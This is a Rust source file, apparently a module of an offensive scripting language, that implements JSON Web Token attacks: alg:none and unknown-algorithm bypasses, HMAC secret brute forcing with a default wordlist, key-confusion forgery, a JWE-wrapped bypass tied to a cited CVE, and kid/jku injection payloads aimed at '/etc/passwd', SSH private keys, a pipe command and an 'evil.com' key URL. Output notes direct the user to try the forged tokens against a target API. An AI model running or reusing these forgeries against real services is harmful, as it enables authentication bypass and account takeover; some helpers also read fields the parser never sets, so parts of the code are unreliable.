//! Standard library: `tallow.jwt` — JSON Web Token analysis, forgery, and attack.
//!
//! # API
//! - `JWT.parse(token)` — decode and analyze a JWT without verification
//! - `JWT.forge(payload, secret, algorithm)` — create a signed JWT
//! - `JWT.attack_none(token)` — try "alg":"none" bypass
//! - `JWT.attack_weak_secrets(token, wordlist)` — brute force HMAC secrets
//! - `JWT.attack_kid_injection(token, payload)` — key ID injection attack
//! - `JWT.attack_alg_confusion(token, public_key_pem)` — RS256→HS256 confusion
//! - `JWT.attack_jwe_wrap(payload, secret)` — JWE wrap bypass (CVE-2026-29000)
//! - `JWT.attack_unknown_alg(token, algorithm)` — unknown algorithm bypass
//! - `JWT.attack_jku_injection(token, jwks_url, kid)` — JKU header injection

use super::StdlibResult;
use crate::interp::{type_name, Value};

use aes_gcm::aead::Aead;
use aes_gcm::Aes256Gcm;
use base64::Engine;
use hmac::{Hmac, Mac};
use sha2::{Digest, Sha256, Sha384, Sha512};

type HmacSha256 = Hmac<Sha256>;
type HmacSha384 = Hmac<Sha384>;
type HmacSha512 = Hmac<Sha512>;

/// Decoded JWT parts
struct DecodedJwt {
    header_b64: String,
    payload_b64: String,
    signature_b64: String,
    header_json: serde_json::Value,
    payload_json: serde_json::Value,
    algorithm: String,
}

fn b64url_decode(s: &str) -> Result<Vec<u8>, String> {
    let padded = s.replace('-', "+").replace('_', "/");
    base64::engine::general_purpose::STANDARD
        .decode(padded)
        .map_err(|e| format!("base64 decode: {e}"))
}

fn b64url_encode(data: &[u8]) -> String {
    base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(data)
}

fn decode_jwt(token: &str) -> Result<DecodedJwt, String> {
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() != 3 {
        return Err("Invalid JWT: expected 3 parts (header.payload.signature)".into());
    }
    let header_bytes = b64url_decode(parts[0])?;
    let payload_bytes = b64url_decode(parts[1])?;
    let header_json: serde_json::Value = serde_json::from_slice(&header_bytes)
        .map_err(|e| format!("header JSON: {e}"))?;
    let payload_json: serde_json::Value = serde_json::from_slice(&payload_bytes)
        .map_err(|e| format!("payload JSON: {e}"))?;
    let alg = header_json["alg"].as_str().unwrap_or("unknown").to_string();

    Ok(DecodedJwt {
        header_b64: parts[0].to_string(),
        payload_b64: parts[1].to_string(),
        signature_b64: parts.get(2).map(|s| s.to_string()).unwrap_or_default(),
        header_json,
        payload_json,
        algorithm: alg,
    })
}

fn jwt_to_value(jwt: &DecodedJwt) -> Value {
    Value::Struct {
        name: "JWT".into(),
        fields: vec![
            ("header".into(), json_to_value(&jwt.header_json)),
            ("payload".into(), json_to_value(&jwt.payload_json)),
            ("algorithm".into(), Value::String(jwt.algorithm.clone())),
            ("signature".into(), Value::String(jwt.signature_b64.clone())),
        ],
    }
}

fn json_to_value(v: &serde_json::Value) -> Value {
    match v {
        serde_json::Value::Null => Value::Nil,
        serde_json::Value::Bool(b) => Value::Bool(*b),
        serde_json::Value::Number(n) => {
            if let Some(i) = n.as_i64() { Value::Int(i as i128) }
            else if let Some(f) = n.as_f64() { Value::Float(f) }
            else { Value::String(n.to_string()) }
        }
        serde_json::Value::String(s) => Value::String(s.clone()),
        serde_json::Value::Array(a) => Value::Array(a.iter().map(json_to_value).collect()),
        serde_json::Value::Object(o) => {
            let entries: Vec<(Value, Value)> = o.iter()
                .map(|(k, v)| (Value::String(k.clone()), json_to_value(v)))
                .collect();
            Value::Map(entries)
        }
    }
}

fn sign_hmac(alg: &str, data: &str, secret: &[u8]) -> Result<Vec<u8>, String> {
    match alg {
        "HS256" => {
            let mut mac = HmacSha256::new_from_slice(secret)
                .map_err(|e| format!("HMAC init: {e}"))?;
            mac.update(data.as_bytes());
            Ok(mac.finalize().into_bytes().to_vec())
        }
        "HS384" => {
            let mut mac = HmacSha384::new_from_slice(secret)
                .map_err(|e| format!("HMAC init: {e}"))?;
            mac.update(data.as_bytes());
            Ok(mac.finalize().into_bytes().to_vec())
        }
        "HS512" => {
            let mut mac = HmacSha512::new_from_slice(secret)
                .map_err(|e| format!("HMAC init: {e}"))?;
            mac.update(data.as_bytes());
            Ok(mac.finalize().into_bytes().to_vec())
        }
        _ => Err(format!("Unsupported algorithm: {alg}")),
    }
}

// ── Dispatch ──

pub fn dispatch(function: &str, args: Vec<Value>) -> Option<StdlibResult> {
    match function {
        "parse" => Some(jwt_parse(args)),
        "forge" => Some(jwt_forge(args)),
        "attack_none" => Some(jwt_attack_none(args)),
        "attack_weak_secrets" => Some(jwt_attack_weak_secrets(args)),
        "attack_jwe_wrap" => Some(jwt_attack_jwe_wrap(args)),
        "attack_unknown_alg" => Some(jwt_attack_unknown_alg(args)),
        "attack_jku_injection" => Some(jwt_attack_jku(args)),
        _ => None,
    }
}

pub fn dispatch_method(object: &Value, method: &str, args: Vec<Value>) -> Option<StdlibResult> {
    if !matches!(object, Value::Struct { name, .. } if name == "JWT") { return None; }
    match method {
        "attack_kid_injection" => Some(jwt_attack_kid(object, args)),
        "attack_alg_confusion" => Some(jwt_attack_alg(object, args)),
        _ => None,
    }
}

pub fn is_known_function(function: &str) -> bool {
    matches!(function, "parse" | "forge" | "attack_none" | "attack_weak_secrets"
        | "attack_jwe_wrap" | "attack_unknown_alg" | "attack_jku_injection")
}

// ── JWT.parse(token) ──

fn jwt_parse(args: Vec<Value>) -> StdlibResult {
    let token = expect_first_string(&args, "token")?;
    let jwt = decode_jwt(token)?;
    Ok(jwt_to_value(&jwt))
}

// ── JWT.forge(payload, secret, algorithm) ──

fn jwt_forge(args: Vec<Value>) -> StdlibResult {
    if args.len() < 3 {
        return Err("JWT.forge: requires (payload, secret, algorithm)".into());
    }
    let payload_str = expect_string(&args[0], "payload")?;
    let secret = expect_string(&args[1], "secret")?;
    let alg = expect_string(&args[2], "algorithm")?;

    let header = serde_json::json!({"alg": alg, "typ": "JWT"});
    let header_b64 = b64url_encode(header.to_string().as_bytes());
    let payload_b64 = b64url_encode(payload_str.as_bytes());
    let signing_input = format!("{}.{}", header_b64, payload_b64);

    let sig = sign_hmac(&alg, &signing_input, secret.as_bytes())?;
    let sig_b64 = b64url_encode(&sig);

    Ok(Value::String(format!("{}.{}.{}", header_b64, payload_b64, sig_b64)))
}

// ── JWT.attack_none(token) ──

fn jwt_attack_none(args: Vec<Value>) -> StdlibResult {
    let token = expect_first_string(&args, "token")?;
    let jwt = decode_jwt(token)?;

    // Create a new token with alg:none and no signature
    let header = serde_json::json!({"alg": "none", "typ": "JWT"});
    let header_b64 = b64url_encode(header.to_string().as_bytes());
    let attack_token = format!("{}.{}.", header_b64, jwt.payload_b64);

    Ok(Value::Struct {
        name: "JWTAttackResult".into(),
        fields: vec![
            ("original_alg".into(), Value::String(jwt.algorithm)),
            ("attack_type".into(), Value::String("none_algorithm".into())),
            ("forged_token".into(), Value::String(attack_token)),
            ("note".into(), Value::String("Use this token with the target API. If accepted, alg:none bypass works.".into())),
        ],
    })
}

// ── JWT.attack_weak_secrets(token, wordlist) ──

fn jwt_attack_weak_secrets(args: Vec<Value>) -> StdlibResult {
    if args.len() < 2 {
        return Err("JWT.attack_weak_secrets: requires (token, wordlist)".into());
    }
    let token = expect_string(&args[0], "token")?.clone();
    let jwt = decode_jwt(&token)?;

    if !jwt.algorithm.starts_with("HS") {
        return Err(format!("attack_weak_secrets requires HMAC algorithm (HS256/384/512), got {}", jwt.algorithm));
    }

    let signing_input = format!("{}.{}", jwt.header_b64, jwt.payload_b64);
    let expected_sig = b64url_decode(&jwt.signature_b64)?;

    // Extract wordlist from args[1]
    let mut secrets: Vec<String> = Vec::new();
    match &args[1] {
        Value::Array(arr) => {
            for v in arr {
                if let Value::String(s) = v { secrets.push(s.clone()); }
            }
        }
        Value::String(s) => {
            // Default wordlist of common secrets
            let defaults = [
                "secret", "password", "jwt_secret", "key", "private",
                "beehiiv", "crownmacro", "nicholascrown", "supersecret",
                "changeme", "admin", "test", "123456", "token",
            ];
            if s == "default" {
                secrets = defaults.iter().map(|s| s.to_string()).collect();
            } else {
                secrets.push(s.clone());
            }
        }
        _ => return Err("attack_weak_secrets: wordlist must be String or Array".into()),
    }

    let mut found = Vec::new();
    for secret in &secrets {
        if let Ok(sig) = sign_hmac(&jwt.algorithm, &signing_input, secret.as_bytes()) {
            if sig == expected_sig {
                found.push(Value::String(secret.clone()));
            }
        }
    }

    let can_forge = !found.is_empty();
    Ok(Value::Struct {
        name: "JWTAttackResult".into(),
        fields: vec![
            ("attack_type".into(), Value::String("weak_secret".into())),
            ("secrets_tried".into(), Value::Int(secrets.len() as i128)),
            ("found_secrets".into(), Value::Array(found)),
            ("can_forge".into(), Value::Bool(can_forge)),
        ],
    })
}

// ── jwt.attack_kid_injection(payload) ──

fn jwt_attack_kid(object: &Value, args: Vec<Value>) -> StdlibResult {
    let jwt_val = extract_jwt(object)?;
    let payload_str = expect_first_string(&args, "payload")?;

    // Parse the provided payload as JSON, or use it raw
    let payload: serde_json::Value = serde_json::from_str(payload_str)
        .unwrap_or(serde_json::json!({"sub": payload_str}));

    // Common KID injection payloads
    let injections = [
        ("../../../../etc/passwd", "Path traversal to /etc/passwd"),
        ("../../../../dev/null", "Path traversal to /dev/null"),
        ("../../../root/.ssh/id_rsa", "SSH private key path"),
        ("/proc/self/environ", "Environment variables"),
        ("sqlite:///etc/passwd", "SQLite injection attempt"),
        ("|ls -la", "Command injection via pipe"),
    ];

    let mut tokens = Vec::new();
    for (kid, desc) in &injections {
        let header = serde_json::json!({"alg": jwt_val.algorithm, "typ": "JWT", "kid": kid});
        let header_b64 = b64url_encode(header.to_string().as_bytes());
        let payload_b64 = b64url_encode(payload.to_string().as_bytes());
        let token = format!("{}.{}.{}", header_b64, payload_b64, jwt_val.signature_b64);

        tokens.push(Value::Struct {
            name: "JWTKidInjection".into(),
            fields: vec![
                ("kid".into(), Value::String(kid.to_string())),
                ("description".into(), Value::String(desc.to_string())),
                ("forged_token".into(), Value::String(token)),
            ],
        });
    }

    Ok(Value::Array(tokens))
}

// ── jwt.attack_alg_confusion(public_key_pem) ──

fn jwt_attack_alg(object: &Value, args: Vec<Value>) -> StdlibResult {
    let jwt_val = extract_jwt(object)?;
    let rsa_pubkey = expect_first_string(&args, "public_key_pem")?;

    // RS256→HS256 confusion: use the RSA public key as the HMAC secret
    // This works when the server uses the same variable for public key retrieval
    // and HMAC secret verification.
    let header = serde_json::json!({"alg": "HS256", "typ": "JWT"});
    let header_b64 = b64url_encode(header.to_string().as_bytes());
    let signing_input = format!("{}.{}", header_b64, jwt_val.payload_b64);

    let sig = sign_hmac("HS256", &signing_input, rsa_pubkey.as_bytes())?;
    let forged = format!("{}.{}.{}", header_b64, jwt_val.payload_b64, b64url_encode(&sig));

    Ok(Value::Struct {
        name: "JWTAttackResult".into(),
        fields: vec![
            ("attack_type".into(), Value::String("alg_confusion".into())),
            ("forged_token".into(), Value::String(forged)),
            ("note".into(), Value::String(
                "RS256→HS256 confusion: uses the RSA public key as HMAC secret. If the server doesn't pin algorithms, this may be accepted.".into()
            )),
        ],
    })
}

// ── Helpers ──

fn extract_jwt(value: &Value) -> Result<DecodedJwt, String> {
    let fields = match value {
        Value::Struct { name, fields } if name == "JWT" => fields,
        _ => return Err(format!("Expected JWT struct, got {}", type_name(value))),
    };

    // Reconstruct from fields
    let header_b64 = field_str(fields, "header_b64");
    let payload_b64 = field_str(fields, "payload_b64");
    let signature_b64 = field_str(fields, "signature_b64");
    let algorithm = field_str(fields, "algorithm");

    let header_json: serde_json::Value = if !header_b64.is_empty() {
        let bytes = b64url_decode(&header_b64)?;
        serde_json::from_slice(&bytes).unwrap_or(serde_json::json!({}))
    } else { serde_json::json!({}) };

    let payload_json: serde_json::Value = if !payload_b64.is_empty() {
        let bytes = b64url_decode(&payload_b64)?;
        serde_json::from_slice(&bytes).unwrap_or(serde_json::json!({}))
    } else { serde_json::json!({}) };

    Ok(DecodedJwt { header_b64, payload_b64, signature_b64, header_json, payload_json, algorithm })
}

fn field_str(fields: &[(String, Value)], name: &str) -> String {
    fields.iter().find(|(n,_)| n == name)
        .and_then(|(_, v)| if let Value::String(s) = v { Some(s.clone()) } else { None })
        .unwrap_or_default()
}

fn expect_string<'a>(val: &'a Value, name: &str) -> Result<&'a String, String> {
    match val { Value::String(s) => Ok(s), _ => Err(format!("Expected String for {name}, got {}", type_name(val))) }
}

fn expect_first_string<'a>(args: &'a [Value], name: &str) -> Result<&'a String, String> {
    match args.first() {
        Some(Value::String(s)) => Ok(s),
        Some(o) => Err(format!("Expected String {name}, got {}", type_name(o))),
        None => Err(format!("Missing {name} argument")),
    }
}

// ── JWT.attack_jwe_wrap(payload, secret) — CVE-2026-29000 ──
// Wraps a JWT with alg:none inside a JWE. Servers that decrypt JWE without
// verifying the inner JWT signature are vulnerable to auth bypass.

fn jwt_attack_jwe_wrap(args: Vec<Value>) -> StdlibResult {
    if args.len() < 2 {
        return Err("JWT.attack_jwe_wrap: requires (payload, secret)".into());
    }
    let payload_str = expect_string(&args[0], "payload")?;
    let secret = expect_string(&args[1], "secret")?;

    // Create inner JWT with alg:none and no signature
    let inner_header = serde_json::json!({"alg": "none", "typ": "JWT"});
    let inner_header_b64 = b64url_encode(inner_header.to_string().as_bytes());
    let inner_payload_b64 = b64url_encode(payload_str.as_bytes());
    let inner_jwt = format!("{}.{}.", inner_header_b64, inner_payload_b64);

    // Derive 256-bit key from secret
    let mut hasher = sha2::Sha256::new();
    sha2::Digest::update(&mut hasher, secret.as_bytes());
    let key_hash = sha2::Digest::finalize(hasher);
    let key_bytes: &[u8] = key_hash.as_slice();

    // AES-256-GCM encrypt the inner JWT
    let cipher = <Aes256Gcm as aes_gcm::KeyInit>::new_from_slice(key_bytes)
        .map_err(|e| format!("AES-GCM init: {e}"))?;

    // Generate random nonce (96 bits for GCM)
    let mut nonce = [0u8; 12];
    let seed = fast_random_byte() as u64;
    nonce[..8].copy_from_slice(&seed.to_be_bytes());
    nonce[8] = fast_random_byte();
    nonce[9] = fast_random_byte();
    nonce[10] = fast_random_byte();
    nonce[11] = fast_random_byte();

    // Encrypt (AES-GCM includes auth tag in ciphertext)
    let ciphertext = cipher.encrypt(nonce.as_slice().into(), inner_jwt.as_bytes())
        .map_err(|e| format!("AES-GCM encrypt: {e}"))?;

    // Build simplified JWE (A256GCM direct — no key wrapping)
    let jwe_header = serde_json::json!({
        "alg": "dir",
        "enc": "A256GCM",
        "typ": "JWT"
    });
    let jwe_header_b64 = b64url_encode(jwe_header.to_string().as_bytes());
    let iv_b64 = b64url_encode(&nonce);
    let ct_b64 = b64url_encode(&ciphertext);

    let jwe_token = format!(
        "{}.{}.{}.{}",
        jwe_header_b64, "".to_string(), iv_b64, ct_b64
    );

    Ok(Value::Struct {
        name: "JWTAttackResult".into(),
        fields: vec![
            ("attack_type".into(), Value::String("jwe_wrap".into())),
            ("inner_jwt".into(), Value::String(inner_jwt)),
            ("forged_token".into(), Value::String(jwe_token)),
            ("note".into(), Value::String(
                "CVE-2026-29000-style: JWE-encapsulated alg:none JWT. Inner JWT uses dir-A256GCM encryption. If the server decrypts without verifying inner signature, auth is bypassed.".into()
            )),
        ],
    })
}

// ── JWT.attack_unknown_alg(token, algorithm) — unknown algorithm bypass ──
// Some servers return empty signature for unknown algorithms, which matches
// an empty attacker-provided signature.

fn jwt_attack_unknown_alg(args: Vec<Value>) -> StdlibResult {
    if args.len() < 2 {
        return Err("JWT.attack_unknown_alg: requires (token, algorithm)".into());
    }
    let token = expect_first_string(&args, "token")?;
    let algorithm = expect_string(&args[1], "algorithm")?;
    let jwt = decode_jwt(token)?;

    // Create a new JWT with the unknown algorithm and original payload
    let header = serde_json::json!({"alg": algorithm, "typ": "JWT"});
    let header_b64 = b64url_encode(header.to_string().as_bytes());
    let forged = format!("{}.{}.", header_b64, jwt.payload_b64);

    // Also try with empty signature
    let forged_with_empty_sig = format!("{}.{}.e30=", header_b64, jwt.payload_b64);

    Ok(Value::Struct {
        name: "JWTAttackResult".into(),
        fields: vec![
            ("attack_type".into(), Value::String("unknown_algorithm".into())),
            ("original_alg".into(), Value::String(jwt.algorithm)),
            ("target_alg".into(), Value::String(algorithm.clone())),
            ("forged_token_no_sig".into(), Value::String(forged)),
            ("forged_token_empty_sig".into(), Value::String(forged_with_empty_sig)),
            ("note".into(), Value::String(format!(
                "If the server returns empty signature for algorithm '{}', the forged_token_empty_sig may bypass verification (CVE-2026-23993).", algorithm
            ))),
        ],
    })
}

// ── JWT.attack_jku_injection(token, jwks_url, kid) — JKU injection ──
// Injects a jku header pointing to an attacker-controlled JWKS endpoint.

fn jwt_attack_jku(args: Vec<Value>) -> StdlibResult {
    if args.len() < 2 {
        return Err("JWT.attack_jku_injection: requires (token, jwks_url, kid?)".into());
    }
    let token = expect_first_string(&args, "token")?;
    let jwks_url = expect_string(&args[1], "jwks_url")?;
    let jwt = decode_jwt(token)?;

    let kid = args.get(2).and_then(|v| if let Value::String(s) = v { Some(s.as_str()) } else { None })
        .unwrap_or("attacker-key-1");

    // Build header with jku + kid injection
    let header = serde_json::json!({
        "alg": jwt.algorithm,
        "typ": "JWT",
        "jku": jwks_url,
        "kid": kid
    });
    let header_b64 = b64url_encode(header.to_string().as_bytes());
    let forged = format!("{}.{}.{}", header_b64, jwt.payload_b64, jwt.signature_b64);

    // Also try with path traversal in kid
    let traversal_kids = [
        ("../../dev/null", "Path traversal to /dev/null"),
        ("../../../../../etc/passwd", "Path traversal to /etc/passwd"),
        ("file:///dev/null", "File URI scheme"),
        ("https://evil.com/jwk", "URL in kid field"),
    ];

    let mut tokens = Vec::new();
    tokens.push(Value::Struct {
        name: "JWTKidInjection".into(),
        fields: vec![
            ("kid".into(), Value::String(kid.to_string())),
            ("description".into(), Value::String("JKU injection with attacker JWKS URL".into())),
            ("forged_token".into(), Value::String(forged)),
        ],
    });

    for (tkid, desc) in &traversal_kids {
        let hdr = serde_json::json!({
            "alg": jwt.algorithm,
            "typ": "JWT",
            "jku": jwks_url,
            "kid": tkid
        });
        let hdr_b64 = b64url_encode(hdr.to_string().as_bytes());
        let ftoken = format!("{}.{}.{}", hdr_b64, jwt.payload_b64, jwt.signature_b64);
        tokens.push(Value::Struct {
            name: "JWTKidInjection".into(),
            fields: vec![
                ("kid".into(), Value::String(tkid.to_string())),
                ("description".into(), Value::String(desc.to_string())),
                ("forged_token".into(), Value::String(ftoken)),
            ],
        });
    }

    Ok(Value::Array(tokens))
}

fn fast_random_byte() -> u8 {
    use std::time::SystemTime;
    SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)
        .map(|d| d.subsec_nanos() as u8)
        .unwrap_or(42)
}
